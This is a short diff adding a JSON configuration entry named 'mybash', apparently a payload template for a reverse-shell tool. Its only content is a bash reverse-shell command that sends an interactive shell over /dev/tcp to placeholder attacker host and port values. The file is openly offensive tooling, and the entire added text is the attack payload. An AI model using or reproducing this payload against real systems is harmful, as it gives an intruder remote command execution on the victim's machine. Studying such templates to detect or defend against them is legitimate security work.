@@ -1,0 +1,6 @@
+{
+  "mybash": {
+    "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+    "con": "tcp"
+  }
+}
